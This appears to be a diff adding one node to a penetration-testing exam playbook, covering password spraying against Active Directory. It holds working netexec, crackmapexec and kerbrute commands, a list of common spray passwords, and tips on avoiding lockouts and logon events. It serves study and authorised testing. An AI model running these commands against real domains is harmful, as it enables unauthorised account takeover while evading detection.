@@ -1,0 +1,18 @@
+{
+  "id": "ad_spray",
+  "phase": "AD",
+  "title": "Password Spraying",
+  "body": "One password across all users. Seasonal passwords, company name variants, default creds. One attempt per account per window to avoid lockout.",
+  "cmd": "# CHECK POLICY FIRST — before any spraying\nnxc smb $ip -u user -p 'pass' --pass-pol\ncrackmapexec smb $ip -u user -p 'pass' --pass-pol   # fallback\n\n# Spray with nxc (netexec) — preferred, CME successor\nnxc smb $ip -u users.txt -p 'Password123!' --continue-on-success\nnxc smb $ip -u users.txt -p 'Winter2025!' --continue-on-success\n\n# Also spray other services simultaneously\nnxc winrm $ip -u users.txt -p 'Password123!'\nnxc rdp   $ip -u users.txt -p 'Password123!'\nnxc ssh   $ip -u users.txt -p 'Password123!'\n\n# Kerbrute spray — faster, fewer logon events than LDAP\n./kerbrute_linux_amd64 passwordspray   -d domain.com --dc $ip   users.txt 'Password123!'\n\n# Common spray passwords:\n# Password1!   Welcome1!   Summer2024!\n# Winter2025!  Company123! <CompanyName>1!",
+  "warn": "One spray attempt per lockout window — locking accounts is exam failure. nxc (netexec) is the maintained fork of crackmapexec with identical syntax. Spray SMB, WinRM, and RDP in the same pass.",
+  "choices": [
+    {
+      "label": "Spray hit — got new creds",
+      "next": "creds_found"
+    },
+    {
+      "label": "Nothing — AS-REP roast or Kerberoast",
+      "next": "asrep_roast"
+    }
+  ]
+}
